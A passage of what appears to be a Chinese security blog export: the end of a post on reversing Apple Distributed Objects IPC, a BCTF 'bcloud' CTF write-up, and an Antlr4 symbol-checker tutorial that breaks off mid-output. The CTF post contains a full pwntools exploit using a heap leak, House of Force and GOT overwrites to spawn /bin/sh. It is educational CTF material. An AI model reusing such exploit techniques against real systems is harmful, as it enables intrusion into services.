~/Downloads/DO_Study</span><br><span class="line">╰─$</span><br></pre></td></tr></table></figure>

<p>效果看起来很简单，类似socket通信那种效果，server跑起来等待连接，client连上去，然后通过launchd和proxy obj调用了server里的方法，参数是client传递的，看起来像是client执行了一个函数，其实真正代码执行的是server。</p>
<p>OC的语法虽然很奇怪，但是问题不大，还是能看懂：</p>
<ul>
<li>server:</li>
</ul>
<p>通过<code>NSConnection</code>注册了一个用于DO的对象，设置的对象是<code>VendMe</code>，注册名是<code>com.foo.my_test_service</code>，用来标示这个服务。随后使用<code>Runloop</code>使得server能随时处理事件但并不退出,关于<code>Runloop</code>的分析本文不会涉及。</p>
<ul>
<li>client</li>
</ul>
<p>client的逻辑很简单，通过<code>NSConnection</code>连接目标服务，然后通过proxy obj调用他的foo方法，并传递一个123的参数给他。</p>
<p>大概逻辑就这个样子。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>为什么要提及这部分，apple大部分服务都不开源，而且用的IPC方式都不确定，逆向的时候需要想办法确定，并且找到关键函数，比如上例中的foo函数，找到处理函数，方便代码审计。</p>
<p>这里只需要关注服务端（废话），所以直接贴F5后的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  VendMe *v3; <span class="comment">// rax</span></span><br><span class="line">  VendMe *v4; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = objc_msgSend(&amp;OBJC_CLASS___VendMe, <span class="string">&quot;alloc&quot;</span>, envp);</span><br><span class="line">  v4 = objc_msgSend(v3, <span class="string">&quot;init&quot;</span>);</span><br><span class="line">  v5 = objc_msgSend(&amp;OBJC_CLASS___NSConnection, <span class="string">&quot;defaultConnection&quot;</span>);</span><br><span class="line">  objc_msgSend(v5, <span class="string">&quot;setRootObject:&quot;</span>, v4);</span><br><span class="line">  objc_msgSend(v5, <span class="string">&quot;registerName:&quot;</span>, CFSTR(<span class="string">&quot;com.foo.my_test_service&quot;</span>));</span><br><span class="line">  v6 = objc_msgSend(&amp;OBJC_CLASS___NSRunLoop, <span class="string">&quot;currentRunLoop&quot;</span>);</span><br><span class="line">  objc_msgSend(v6, <span class="string">&quot;run&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>oc这些函数调用基本都变成<code>objec_msgSend(a,b,xxx)</code>了，不过不太影响看，我的理解就是<br><code>a.b(xxx)</code>，大概这个样子，知道这行代码在做什么，对于逆向已经够了。</p>
<p>关键点在于找DO的对象以及和他绑定的方法。通过上面的方法，能找到:<code>v4--&gt;v3--&gt;OBJC_CLASS___VendMe</code>,那么就是<code>OBJC_CLASS___VendMe</code>这个对象了，下面是找和他绑定的方法。</p>
<p>直接找到的是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__objc_data:0000000100001198 _OBJC_CLASS_$_VendMe __objc2_class &lt;offset _OBJC_METACLASS_$_VendMe, \</span><br><span class="line">__objc_data:0000000100001198                                         ; DATA XREF: __objc_classlist:0000000100001060↑o</span><br><span class="line">__objc_data:0000000100001198                                         ; __objc_classrefs:classRef_VendMe↑o</span><br><span class="line">__objc_data:0000000100001198                                offset _OBJC_CLASS_$_NSObject, \</span><br><span class="line">__objc_data:0000000100001198                                offset __objc_empty_cache, 0, offset VendMe_$classData&gt;</span><br></pre></td></tr></table></figure>

<p>然后根据classData找到 ： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__objc_const:00000001000010D8 VendMe_$classData __objc2_class_ro &lt;0, 8, 8, 0, 0, offset aVendme, \</span><br><span class="line">__objc_const:00000001000010D8                                         ; DATA XREF: __objc_data:_OBJC_CLASS_$_VendMe↓o</span><br><span class="line">__objc_const:00000001000010D8                                   offset _OBJC_INSTANCE_METHODS_VendMe, 0, 0, 0, 0&gt; ; &quot;VendMe&quot;</span><br><span class="line">__objc_const:00000001000010D8 __objc_const    ends</span><br><span class="line">__objc_const:00000001000010D8</span><br></pre></td></tr></table></figure>

<p>最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__objc_const:00000001000010B8 _OBJC_INSTANCE_METHODS_VendMe __objc2_meth_list &lt;18h, 1&gt;</span><br><span class="line">__objc_const:00000001000010B8                                         ; DATA XREF: __objc_const:VendMe_$classData↓o</span><br><span class="line">__objc_const:00000001000010C0                 __objc2_meth &lt;offset sel_foo_, offset aVv2008i16, \ ; -[VendMe foo:] ...</span><br><span class="line">__objc_const:00000001000010C0                               offset __VendMe_foo__&gt;</span><br></pre></td></tr></table></figure>


<p>依靠对<code>classData</code>的引用看。</p>
<p>其实也可以的知道了DO对象的对象名之后直接搜函数列表，比如:<code>VendeMe:</code>。 这个是在有符号的情况下，不过符号这个看运气了，不一定有 符号。</p>
<p>VendeMe:foo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl -[VendMe foo:](VendMe *self, SEL a2, <span class="keyword">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  NSLog(CFSTR(<span class="string">&quot;%d&quot;</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户的参数从a3开始算。</p>
<h2 id="这类服务漏洞挖掘"><a href="#这类服务漏洞挖掘" class="headerlink" title="这类服务漏洞挖掘"></a>这类服务漏洞挖掘</h2><p>主动fuzz：找到处理函数，确定类型，然后主动写客户端fuzz。</p>
<p>被动fuzz：hook处理点，但是要一个一个hook，然后修改数据。</p>
<p>代码审计：找处理函数，人肉看逻辑。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="https://googleprojectzero.blogspot.com/2015/09/revisiting-apple-ipc-1-distributed_28.html">revisiting-apple-ipc</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Apple</tag>
        <tag>MacOS</tag>
      </tags>
  </entry>
  <entry>
    <title>BCTF--cloud</title>
    <url>/2016/09/27/BCTF-cloud/</url>
    <content><![CDATA[<h4 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00: 简介"></a>0x00: 简介</h4><p>最近在复现一些优质CTF里的题目，所以这个系列的文章会有点多…先做了下BCTF的热身题目–bcloud，一个堆上的利用。</p>
<ul>
<li>   测试环境:ubuntu 16.04 x64</li>
</ul>
<a id="more"></a>
<h4 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01:程序分析"></a>0x01:程序分析</h4><p>程序是个菜单式的程序，看了下功能，应该就是堆上的一些利用了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/ida_view.jpg"><br>看下开启了什么保护。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/checksec.jpg"></p>
<p>基本信息就是上面说的那样，下面是具体的分析：</p>
<ul>
<li>   功能：每个笔记(chunk)的大小、内容、状态以数组形式存储在.bss段</li>
<li>   问题：ban掉了show的操作，需要自己去构造下泄露了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/show_note.jpg"></li>
</ul>
<p>先开始看在进入菜单之前的函数:<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/heap_addr_leak.jpg"><br>这个函数读入用户名，没看到明显的溢出点，但是问题在于 unsafe_read() 函数，如果输入长度为0x40，那么就可以引发一个堆地址泄露，即在输出用户名的时候，输出一个堆地址。<br>    地址泄露 get!<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/hof.jpg"><br>下面是这个函数，读取host 和 org然后malloc分配空间，之后拷贝过去，由于使用的还是unsafe_read(),所以可以构造一个hof，这种利用需要堆地址，正好，之前有个泄露，这下就满足条件了。</p>
<h4 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02:利用思路"></a>0x02:利用思路</h4><p>那么既然确定了是hof利用，利用的思路就出来了：</p>
<p>利用hof的思路，去分配到.bss上的 0x0804b0a0 地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk_length[]   ----&gt; 0x0804b0a0</span><br><span class="line">...</span><br><span class="line">chunk_status[]</span><br><span class="line">...</span><br><span class="line">chunk_list[]     ----&gt; 0x0804B120</span><br></pre></td></tr></table></figure>
<p>分配到之后，利用edit功能去填入要改写的函数got，先构造一次泄露：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk_list[]中放：atoi@got,free@got,atoi@got</span><br></pre></td></tr></table></figure>
<p>然后修改free@got为printf函数地址，利用delete功能去泄露atoi地址。</p>
<ol>
<li>   得到atoi()地址之后，利用libc.so确定system()和atoi()的偏移。</li>
<li>   修改atoi()地址为system()，之后随便用下菜单的功能，发送一个/bin/sh\0过去就getshell了。</li>
</ol>
<h4 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03:exploit"></a>0x03:exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># by muhe</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">name_addr = <span class="number">0x0804B0CC</span></span><br><span class="line">bss_addr  = <span class="number">0x0804b0a0</span></span><br><span class="line">atoi = <span class="number">0x0804b03c</span></span><br><span class="line">free = <span class="number">0x0804b014</span></span><br><span class="line">printf_plt = <span class="number">0x080484D0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">chunk_length[]   ----&gt; 0x0804b0a0</span></span><br><span class="line"><span class="string">chunk_status[]</span></span><br><span class="line"><span class="string">chunk_list[]     ----&gt; 0x0804B120</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">target = <span class="string">"./bcloud"</span></span><br><span class="line"><span class="comment">#target = ('127.0.0.1',10001)</span></span><br><span class="line">p = process(target)</span><br><span class="line"><span class="comment">#p = context(target)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_note</span><span class="params">(p,length,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(p,index,new_content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(new_content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(p,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># leak heap address</span></span><br><span class="line">    name = <span class="string">"A"</span>*<span class="number">60</span>+<span class="string">"BBBB"</span></span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'BBBB'</span>)</span><br><span class="line">    leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(leak)</span><br><span class="line">    <span class="comment"># hof here</span></span><br><span class="line">    usr_host = <span class="string">"B"</span>*<span class="number">0x40</span></span><br><span class="line">    fuck_top_chunk = <span class="string">"\xff\xff\xff\xff"</span></span><br><span class="line">    p.send(usr_host)</span><br><span class="line">    p.sendline(fuck_top_chunk)</span><br><span class="line">    <span class="comment"># get list_length chunk..</span></span><br><span class="line">    size = (bss_addr<span class="number">-0x8</span>)-leak<span class="number">-0x8</span> - <span class="number">208</span></span><br><span class="line">    new_note(p,size,<span class="string">'AAAA'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'172'</span>)</span><br><span class="line">    <span class="comment">#fill the list_length[] &amp;&amp; list_content[]</span></span><br><span class="line">    payload = p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">4</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>) * <span class="number">29</span></span><br><span class="line">    payload += p32(atoi)</span><br><span class="line">    payload += p32(free)</span><br><span class="line">    payload += p32(atoi)</span><br><span class="line">    payload += p32(<span class="number">0</span>) * <span class="number">8</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment"># change free() to printf()</span></span><br><span class="line">    raw_input(<span class="string">'$debug...'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.send(p32(printf_plt))</span><br><span class="line">    <span class="comment"># leak addr of atoi()</span></span><br><span class="line">    delete_note(p,<span class="number">0</span>)</span><br><span class="line">    garbage = p.recvuntil(<span class="string">"Input the id:\n"</span>)</span><br><span class="line">    leak_atoi = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"got atoi() ----&gt;"</span>+hex(leak_atoi)</span><br><span class="line">    <span class="comment"># get system() addr</span></span><br><span class="line">    system_addr = leak_atoi + <span class="number">0xd8f0</span></span><br><span class="line">    <span class="comment"># overwrite atoi() to system() &amp;&amp; getshell</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.send(p32(system_addr))</span><br><span class="line">    garbage = p.recv()</span><br><span class="line">    p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>getshell~~<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/bcloud_wp/getshell.jpg"></p>
<p>0x04:参考<br><a href="http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html">uaf.io</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Antlr4初体验</title>
    <url>/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h4 id="0x00：介绍"><a href="#0x00：介绍" class="headerlink" title="0x00：介绍"></a>0x00：介绍</h4><p>Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。</p>
<a id="more"></a>

<h4 id="0x01-why-this？"><a href="#0x01-why-this？" class="headerlink" title="0x01: why this？"></a>0x01: why this？</h4><p>我一直觉得编译原理相关的东西（理论也好，工具也好）可以和漏洞挖掘发生奇妙的化学反应。和9k师傅聊过相关的东西，有类似想法的人很多。甚至<code>github</code>上六年前的一个项目，使用<code>flex+bison</code>去生成文件来做<code>fuzz</code>。</p>
<p>和<code>flex+bison</code>比较，antlr4无疑是更容易上手，也更加强大的，当然用哪个就是仁者见仁智者见智了。</p>
<p>在深入学习这些东西之后，对domato的思想有了更深刻的理解。其实就是词法分析那套，自顶向下的。不得不说，真的很棒，而且应用范围很广泛，但是效果怎么样我就不知道了，还在摸索。</p>
<h4 id="0x02：-关于本文"><a href="#0x02：-关于本文" class="headerlink" title="0x02： 关于本文"></a>0x02： 关于本文</h4><p>《Antlr4权威指南》中8.4章节练习的学习记录。这部分的例子是一个语法检查器，针对<code>Cymbol</code>语言的。</p>
<p>比如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    g();   <span class="comment">// forward reference is ok</span></span><br><span class="line">    i = <span class="number">3</span>; <span class="comment">// no declaration for i (error)</span></span><br><span class="line">    g = <span class="number">4</span>; <span class="comment">// g is not variable (error)</span></span><br><span class="line">    <span class="keyword">return</span> x + y; <span class="comment">// x, y are defined, so no problem</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> y;</span><br><span class="line">    y = <span class="number">9</span>; <span class="comment">// y is defined</span></span><br><span class="line">    f();   <span class="comment">// backward reference is ok</span></span><br><span class="line">    z();   <span class="comment">// no such function (error)</span></span><br><span class="line">    y();   <span class="comment">// y is not function (error)</span></span><br><span class="line">    x = f; <span class="comment">// f is not a variable (error)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过该语法检查器，可以将一些语法错误找出来，比如未定义的符号、类型引用错误(函数当变量，变量当函数)。</p>
<h4 id="0x03-例子"><a href="#0x03-例子" class="headerlink" title="0x03: 例子"></a>0x03: 例子</h4><h5 id="1-语法分析"><a href="#1-语法分析" class="headerlink" title="1. 语法分析"></a>1. 语法分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;** Simple statically-typed programming language with functions and variables</span><br><span class="line"> *  taken from &quot;Language Implementation Patterns&quot; book.</span><br><span class="line"> *&#x2F;</span><br><span class="line">grammar Cymbol;</span><br><span class="line"></span><br><span class="line">file:   (functionDecl | varDecl)+ ;</span><br><span class="line"></span><br><span class="line">varDecl</span><br><span class="line">    :   type ID (&#39;&#x3D;&#39; expr)? &#39;;&#39;</span><br><span class="line">    ;</span><br><span class="line">type:   &#39;float&#39; | &#39;int&#39; | &#39;void&#39; ; &#x2F;&#x2F; user-defined types</span><br><span class="line"></span><br><span class="line">functionDecl</span><br><span class="line">    :   type ID &#39;(&#39; formalParameters? &#39;)&#39; block &#x2F;&#x2F; &quot;void f(int x) &#123;...&#125;&quot;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">formalParameters</span><br><span class="line">    :   formalParameter (&#39;,&#39; formalParameter)*</span><br><span class="line">    ;</span><br><span class="line">formalParameter</span><br><span class="line">    :   type ID</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block:  &#39;&#123;&#39; stat* &#39;&#125;&#39; ;   &#x2F;&#x2F; possibly empty statement block</span><br><span class="line"></span><br><span class="line">stat:   block</span><br><span class="line">    |   varDecl</span><br><span class="line">    |   &#39;if&#39; expr &#39;then&#39; stat (&#39;else&#39; stat)?</span><br><span class="line">    |   &#39;return&#39; expr? &#39;;&#39; </span><br><span class="line">    |   expr &#39;&#x3D;&#39; expr &#39;;&#39; &#x2F;&#x2F; assignment</span><br><span class="line">    |   expr &#39;;&#39;          &#x2F;&#x2F; func call</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">&#x2F;* expr below becomes the following non-left recursive rule:</span><br><span class="line">expr[int _p]</span><br><span class="line">    :   ( &#39;-&#39; expr[6]</span><br><span class="line">        | &#39;!&#39; expr[5]</span><br><span class="line">        | ID</span><br><span class="line">        | INT</span><br><span class="line">        | &#39;(&#39; expr &#39;)&#39;</span><br><span class="line">        )</span><br><span class="line">        ( &#123;8 &gt;&#x3D; $_p&#125;? &#39;*&#39; expr[9]</span><br><span class="line">        | &#123;7 &gt;&#x3D; $_p&#125;? (&#39;+&#39;|&#39;-&#39;) expr[8]</span><br><span class="line">        | &#123;4 &gt;&#x3D; $_p&#125;? &#39;&#x3D;&#x3D;&#39; expr[5]</span><br><span class="line">        | &#123;10 &gt;&#x3D; $_p&#125;? &#39;[&#39; expr &#39;]&#39;</span><br><span class="line">        | &#123;9 &gt;&#x3D; $_p&#125;? &#39;(&#39; exprList? &#39;)&#39;</span><br><span class="line">        )*</span><br><span class="line">    ;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">expr:   ID &#39;(&#39; exprList? &#39;)&#39;    # Call</span><br><span class="line">    |   expr &#39;[&#39; expr &#39;]&#39;       # Index</span><br><span class="line">    |   &#39;-&#39; expr                # Negate</span><br><span class="line">    |   &#39;!&#39; expr                # Not</span><br><span class="line">    |   expr &#39;*&#39; expr           # Mult</span><br><span class="line">    |   expr (&#39;+&#39;|&#39;-&#39;) expr     # AddSub</span><br><span class="line">    |   expr &#39;&#x3D;&#x3D;&#39; expr          # Equal</span><br><span class="line">    |   ID                      # Var</span><br><span class="line">    |   INT                     # Int</span><br><span class="line">    |   &#39;(&#39; expr &#39;)&#39;            # Parens</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">exprList : expr (&#39;,&#39; expr)* ;   &#x2F;&#x2F; arg list</span><br><span class="line"></span><br><span class="line">K_FLOAT : &#39;float&#39;;</span><br><span class="line">K_INT   : &#39;int&#39;;</span><br><span class="line">K_VOID  : &#39;void&#39;;</span><br><span class="line">ID  :   LETTER (LETTER | [0-9])* ;</span><br><span class="line">fragment</span><br><span class="line">LETTER : [a-zA-Z] ;</span><br><span class="line"></span><br><span class="line">INT :   [0-9]+ ;</span><br><span class="line"></span><br><span class="line">WS  :   [ \t\n\r]+ -&gt; skip ;</span><br><span class="line"></span><br><span class="line">SL_COMMENT</span><br><span class="line">    :   &#39;&#x2F;&#x2F;&#39; .*? &#39;\n&#39; -&gt; skip</span><br><span class="line">    ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-符号表"><a href="#2-符号表" class="headerlink" title="2. 符号表"></a>2. 符号表</h5><p>这部分是精髓，作者直接拿了自己另一本书里的代码来用，代码不长也好懂。这里我只列一部分比较重要的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseScope</span> <span class="keyword">implements</span> <span class="title">Scope</span> </span>&#123;</span><br><span class="line">    Scope enclosingScope; <span class="comment">// 临近的作用区，如果当前是全局作用域，应该置null</span></span><br><span class="line">                          <span class="comment">// 因为作用域查找是往前找的，全局已经是最靠前了</span></span><br><span class="line">    Map&lt;String, Symbol&gt; symbols = <span class="keyword">new</span> LinkedHashMap&lt;String, Symbol&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BaseScope</span><span class="params">(Scope enclosingScope)</span> </span>&#123; <span class="keyword">this</span>.enclosingScope = enclosingScope;  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Symbol <span class="title">resolve</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Symbol s = symbols.get(name);</span><br><span class="line">        <span class="keyword">if</span> ( s!=<span class="keyword">null</span> ) <span class="keyword">return</span> s;<span class="comment">//在当前作用域找到了，直接返回</span></span><br><span class="line">        <span class="comment">//如果临近作用域不空，那么就去临近作用域找</span></span><br><span class="line">        <span class="comment">//比如，一个函数内，符号定义没找到，就去往上（全局）找</span></span><br><span class="line">        <span class="keyword">if</span> ( enclosingScope != <span class="keyword">null</span> ) <span class="keyword">return</span> enclosingScope.resolve(name);</span><br><span class="line">        <span class="comment">//还找不到，那就是未定义，报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">define</span><span class="params">(Symbol sym)</span> </span>&#123;</span><br><span class="line">        symbols.put(sym.name, sym);</span><br><span class="line">        sym.scope = <span class="keyword">this</span>; <span class="comment">// track the scope in each symbol</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Scope <span class="title">getEnclosingScope</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> enclosingScope; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> getScopeName()+<span class="string">&quot;:&quot;</span>+symbols.keySet().toString(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-如何检查"><a href="#3-如何检查" class="headerlink" title="3. 如何检查"></a>3. 如何检查</h5><p>因为目标语言<code>Cymbol</code>允许向前引用，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    g();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以需要两次遍历，第一次找到所有定义，并放入符号表，将符号表构造好。<br>接下来进行第二次遍历，这时遇到一个引用，就去找符号表，找到了就是正常，找不到就是有问题。</p>
<h5 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h5><p>主要是两个文件，<code>DefPhase.java</code>和<code>RefPhase.java</code>。</p>
<h6 id="1-Defphase"><a href="#1-Defphase" class="headerlink" title="1. Defphase"></a>1. Defphase</h6><p>关键的问题：在第一次遍历构造符号表的时候，遇到新的作用域，需要把新的作用域的父作用域设置为当前作用域，并且把新的作用域设置为当前作用域。</p>
<p>对于遇到的变量定义直接使用对应的构造符号表的对象去构造就好了。</p>
<h6 id="2-RefPhase"><a href="#2-RefPhase" class="headerlink" title="2. RefPhase"></a>2. RefPhase</h6><p>遍历检查每个引用部分，去符号表里查找，找不到就报错。这部分比较简单。</p>
<h5 id="3-checkSymbol"><a href="#3-checkSymbol" class="headerlink" title="3. checkSymbol"></a>3. checkSymbol</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">parser.setBuildParseTree(<span class="keyword">true</span>);</span><br><span class="line">ParseTree tree = parser.file();</span><br><span class="line"><span class="comment">// show tree in text form</span></span><br><span class="line"><span class="comment">//System.out.println(tree.toStringTree(parser));</span></span><br><span class="line"></span><br><span class="line">ParseTreeWalker walker = <span class="keyword">new</span> ParseTreeWalker();</span><br><span class="line">DefPhase def = <span class="keyword">new</span> DefPhase();</span><br><span class="line">walker.walk(def, tree);</span><br><span class="line"><span class="comment">// create next phase and feed symbol table info from def to ref phase</span></span><br><span class="line">RefPhase ref = <span class="keyword">new</span> RefPhase(def.globals, def.scopes);</span><br><span class="line">walker.walk(ref, tree);</span><br></pre></td></tr></table></figure>

<h5 id="5-结果"><a href="#5-结果" class="headerlink" title="5. 结果"></a>5. 结果</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]</span></span><br><span class="line">$ antlr4 Cymbol.g4</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]</span></span><br><span class="line">$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecation</span><br><span class="line">CheckSymbols.java:9: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">import org.antlr.v4.runtime.ANTLRInputStream;</span><br><span class="line">                           ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">        ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">                                     ^</span><br><span class="line">3 个警告</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]</span></span><br><span class="line">$ java CheckSymbols vars.cymbol</span><br><span class="line">locals:[]</span><br><span class="line"><span class="keyword">function</span>&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]</span><br><span class="line">locals:[x, y]</span><br><span class="line"><span class="keyword">function</span>&lt;g:tVOID&gt;:[]</span><br><span class="line">globals:[f, g]</span><br><span class="line">line 3:4 no such variable: i</span><br><span class="line">line 